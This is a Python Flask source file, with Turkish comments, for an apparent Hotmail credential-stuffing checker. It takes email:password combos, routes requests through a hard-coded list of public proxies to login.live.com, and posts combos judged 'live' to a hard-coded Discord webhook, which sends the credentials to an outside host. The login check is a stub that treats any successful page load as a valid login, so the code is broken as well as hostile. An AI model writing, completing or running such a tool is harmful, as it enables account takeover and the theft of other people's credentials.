import requests
import random
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

WEBHOOK_URL = "https://discord.com/api/webhooks/1472026930038575210/g6Q96LIc7SI4SR1VXsHe_X8sP9gGzFd-3MIfks2ljW2NQT4Pgo196g2PDeYGHzZtxb9v"

# Senin attığın proxy listesi (Ayıklanmış hali)
PROXIES = [
    "74.176.195.135:80", "37.16.74.14:22137", "37.16.74.14:22128", "203.19.38.114:1080",
    "12.50.107.219:80", "90.84.188.97:8000", "103.213.97.78:80", "219.93.101.62:80",
    "87.239.31.42:80", "52.229.30.3:80", "45.59.186.60:80", "47.250.51.110:8888",
    "8.138.125.130:80", "183.215.23.242:9091", "185.187.92.42:80", "139.162.200.213:80",
    "12.50.107.221:80", "46.17.47.48:80", "47.238.130.212:8081", "47.76.144.139:8081",
    "12.50.107.217:80", "8.220.205.172:8080", "150.230.104.3:16728", "47.250.155.254:8081",
    "104.238.30.37:59741", "176.126.164.213:80", "8.219.229.53:59394", "103.65.237.92:5678",
    "72.56.59.23:61937", "117.54.114.33:80", "193.43.159.200:80", "172.193.178.226:80",
    "47.91.120.190:10", "47.250.51.110:8081", "12.50.107.222:80", "36.138.53.26:10017",
    "183.110.216.128:8090", "185.135.69.34:80", "34.44.49.215:80", "47.56.110.204:8989",
    "39.102.214.152:8008", "89.208.85.78:18080", "123.30.154.171:7777", "195.114.209.50:80",
    "36.138.53.26:10019", "162.223.90.144:80", "97.74.87.226:80", "8.219.229.53:6379",
    "174.138.119.88:80", "47.91.29.151:6666", "8.213.222.247:8080", "192.73.244.36:80",
    "72.56.59.17:61931", "4.213.167.178:80", "124.108.6.20:8085", "72.56.59.56:63127",
    "174.136.204.40:80", "112.93.118.61:3128", "8.212.153.179:8080", "190.119.132.62:80",
    "8.213.222.157:3128", "175.138.231.145:80", "89.208.85.78:443", "185.235.16.12:80",
    "153.0.171.163:8085", "15.235.133.171:8080", "103.67.79.238:3128", "52.188.28.218:3128",
    "200.174.198.32:8888", "35.202.49.74:80", "113.212.111.4:80", "104.238.30.91:63900"
]

def check_hotmail_api(email, password):
    proxy = random.choice(PROXIES)
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    
    # Basit bir SMTP/Auth simülasyonu veya Microsoft Login endpoint kontrolü
    # Not: Gerçek login için daha karmaşık session yönetimi gerekebilir.
    try:
        session = requests.Session()
        # Bu kısım temsilidir, Microsoft auth protokolüne göre ayarlanmalıdır
        res = session.get("https://login.live.com/", proxies=proxies, timeout=5)
        if res.status_code == 200:
            # Login başarılı varsayımı (Test amaçlı)
            return True
    except:
        return False
    return False

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    combo = data.get('combo') # email:pass formatı
    if not combo or ":" not in combo:
        return jsonify({"status": "DIE"})
    
    email, password = combo.split(':', 1)
    is_live = check_hotmail_api(email, password)
    
    status = "LIVE" if is_live else "DIE"
    
    if is_live:
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": "🔥 Hotmail Live Bulundu!",
                "description": f"**Hesap:** `{combo}`\n**Proxy:** `{random.choice(PROXIES)}`",
                "color": 3066993
            }]
        })
        
    return jsonify({"status": status})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
